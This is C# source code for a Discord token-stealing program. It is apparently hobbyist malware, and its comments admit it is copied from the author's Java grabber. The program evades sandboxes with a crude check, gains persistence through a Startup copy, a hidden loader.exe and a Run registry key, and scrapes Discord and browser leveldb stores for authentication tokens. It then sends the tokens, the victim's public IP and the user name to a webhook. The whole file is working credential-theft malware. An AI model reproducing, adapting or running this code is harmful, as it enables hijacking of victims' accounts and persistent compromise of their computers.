using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace Grab {
    public class Program {
        public static void Main(string[] args) {
            if ((new System.Management.ManagementObjectSearcher("SELECT * FROM Win32_PortConnector")).Get().Count == 0) return;

            var webhook = "no sir";
            var webhookName = "beta";
            var webhookImage = "https://i.ibb.co/fps45hd/steampfp.jpg";

            var pcName = Environment.UserName;
            copy2startup();
            var APPDATA = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var LOCAL = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            var list = new List<String>();

            // im just copy paste from my java grabber LMAO
            list.Add(APPDATA + "\\Discord\\Local Storage\\leveldb\\");
            list.Add(APPDATA + "\\discordcanary\\Local Storage\\leveldb\\");
            list.Add(APPDATA + "\\discordptb\\Local Storage\\leveldb\\");
            list.Add(APPDATA + "\\Lightcord\\Local Storage\\leveldb\\");

            list.Add(LOCAL + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\");
            list.Add(LOCAL + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\");
            list.Add(LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default");
            list.Add(LOCAL + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\");
            list.Add(LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
            list.Add(APPDATA + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\");
            list.Add(APPDATA + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\");
            list.Add(LOCAL + "\\Opera Software\\Opera Neon\\User Data\\Default\\Local Storage\\leveldb\\");

            var token = new List<String>();
            foreach (var path in list) {
                if (!Directory.Exists(path)) continue;

                var filelist = new DirectoryInfo(path);
                foreach (var file in filelist.GetFiles()) {
                    if (file.Equals("LOCK")) continue;
                    try {
                        var data = file.OpenText().ReadToEnd();
                        foreach (Match match in Regex.Matches(data, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}")) {
                            if (token.Contains(match.Value)) continue;
                            var info = TokenUtil.checkToken(match.Value);
                            if (info.vaild) {
                                // add "info.username" will make 400 code when send webhook idk why who know make a issue or pr
                                token.Add(info.token/* + " (" + info.username + ")"*/);
                            }
                        }

                    } catch (Exception) { }
                }
            }

            var result_token = String.Join("\\n", token.ToArray());
            if (String.IsNullOrEmpty(result_token)) result_token = "no token :c";
            
            // super lazy unicode remover
            //result_token = Regex.Replace(result_token, "(\\\\u....)", String.Empty);

            var client = new WebClient();
            client.Headers.Add("content-type", "application/json");
            client.Headers.Add("User-Agent", "kath");
            client.UploadData(webhook, "POST", Encoding.UTF8.GetBytes("{\"tts\":false,\"avatar_url\":\"%pfp_url%\",\"embeds\":[{\"color\":65280,\"footer\":{\"icon_url\":\"%pfp_url%\",\"text\":\"%footer%\"},\"title\":\"Token Found C#\",\"fields\":[{\"inline\":true,\"name\":\"Ip:\",\"value\":\"%ip%\"},{\"inline\":true,\"name\":\"Pc Name:\",\"value\":\"%pc_name%\"},{\"inline\":false,\"name\":\"Token:\",\"value\":\"```\\n%token%\\n```\"}]}],\"content\":\"\",\"username\":\"%bot_name%\"}".Replace("%pfp_url%", webhookImage).Replace("%footer%", DateTime.Now.DayOfWeek.ToString() + " | " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")).Replace("%ip%", getIp()).Replace("%pc_name%", pcName).Replace("%token%", result_token).Replace("%bot_name%", webhookName)));
        }

        public static void copy2startup() {
            // yay this new thread it work on c# too
            new Thread(() => {
                try {
                    var startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + /*AppDomain.CurrentDomain.FriendlyName*/ "5cd5-11ec-bf63-0242.exe";
                    if (!File.Exists(startup)) {
                        File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, startup);
                    }
                } catch (Exception) { }

                try {
                    var path = Environment.ExpandEnvironmentVariables("%HOMEDRIVE%%HOMEPATH%") + "\\loader.exe";
                    if (!File.Exists(path)) {
                        File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, path);
                    }
                } catch (Exception) { }

                //Runtime.execSync("regedit.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Loader /t REG_SZ /d \"" + Environment.ExpandEnvironmentVariables("%HOMEDRIVE%%HOMEPATH%") + "\\loader.exe" + "\"");
                var regKey = Registry.CurrentUser.OpenSubKey("Software", true).OpenSubKey("Microsoft", true).OpenSubKey("Windows", true).OpenSubKey("CurrentVersion", true).OpenSubKey("Run", true);
                // ^^ lmao pro c# gamer will mad at me im sure xd
                regKey.SetValue("Init Loader", Environment.ExpandEnvironmentVariables("%HOMEDRIVE%%HOMEPATH%") + "\\loader.exe");

                File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "/" + /*AppDomain.CurrentDomain.FriendlyName*/"5cd5-11ec-bf63-0242.exe", FileAttributes.Hidden | FileAttributes.System);
                File.SetAttributes(Environment.ExpandEnvironmentVariables("%HOMEDRIVE%%HOMEPATH%") + "\\loader.exe", FileAttributes.Hidden | FileAttributes.System);


            }).Start();
        }

        /**
         * bro how tf do i use json in c#????????
         * so just copy from java lol
         */
        public static String getJsonKey(String hson, String key) {
            try {
                return Regex.Match(hson, "\"" + key + "\": \".*\"").Value.Split('"')[3];
            } catch (Exception) {
                return null;
            }
        }

        public static String getIp() {
            try {
                return new WebClient().DownloadString("http://api.ipify.org");
            } catch (Exception e) {
                return "err> " + e.Message;
            }
        }
    }
}
